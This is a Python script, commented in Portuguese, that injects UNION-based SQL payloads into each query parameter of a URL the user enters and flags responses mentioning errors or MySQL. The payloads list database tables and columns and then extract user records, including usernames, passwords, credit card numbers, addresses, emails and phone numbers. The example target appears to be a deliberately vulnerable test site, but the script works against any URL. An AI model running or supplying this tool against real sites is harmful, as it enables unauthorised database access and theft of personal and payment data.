import requests
from urllib.parse import urlparse, parse_qs, urlencode
import re
from colorama import Fore, Style, init

# Inicializa o colorama
init(autoreset=True)

def test_sql_injection(url):
    # Payloads específicos de injeção SQL que você deseja testar
    sql_tests = [
        "UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema = DATABASE() -- `",
        "UNION SELECT 1, version(),3",
        "UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name = 'users' AND table_schema = DATABASE() -- `",
        "UNION SELECT 1, GROUP_CONCAT(CONCAT(uname, ':', pass)), 3 FROM users -- `",
        "UNION SELECT 1, GROUP_CONCAT(CONCAT(uname, ':', pass, ':', cc, ':', address, ':', email, ':', name, ':', phone, ':', cart)), 3 FROM users -- `",
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    
    # Parse a URL para separar a base e os parâmetros
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = parse_qs(parsed_url.query)
    
    if not params:
        print("Nenhum parâmetro encontrado na URL para testar.")
        return
    
    for param in params:
        for sql_test in sql_tests:
            # Copia os parâmetros originais
            modified_params = params.copy()
            # Adiciona o payload de teste ao final do valor do parâmetro original
            original_value = modified_params[param][0]  # Obtém o valor original do parâmetro
            modified_params[param] = [f"{original_value} {sql_test}"]
            
            # Reconstrói a URL com os parâmetros modificados
            new_query_string = urlencode(modified_params, doseq=True)
            test_url = f"{base_url}?{new_query_string}"
            
            # Envia uma solicitação GET com o payload de teste
            try:
                response = requests.get(test_url, headers=headers)
                print(f"\n{Fore.BLUE}Testado: {test_url}")
                print(f"Código de status: {response.status_code}\n")

                # Tenta forçar a codificação para latin-1 ou utf-8
                response.encoding = 'latin-1'
                content = response.text.lower()
                if 'error' in content or 'mysql' in content:
                    print(Fore.RED + "Possível vulnerabilidade de injeção SQL detectada com o payload <====================================>")
                    print(f"URL testada: {test_url}")  # Adiciona a URL testada
                    for sql_test in sql_tests:
                        if sql_test.lower() in content:
                            print(Fore.RED + f"Payload: {sql_test}")
                            print("Mensagem encontrada na resposta.")
                
                # Adiciona uma pausa para facilitar a leitura dos resultados
                import time
                time.sleep(2)

            except requests.RequestException as e:
                print(f"Erro ao testar URL: {e}")

# Solicita a URL do usuário
url = input("\nDigite a URL completa do website (ex: http://testphp.vulnweb.com/artists.php?artist=-1): ")
print("\n")
test_sql_injection(url)
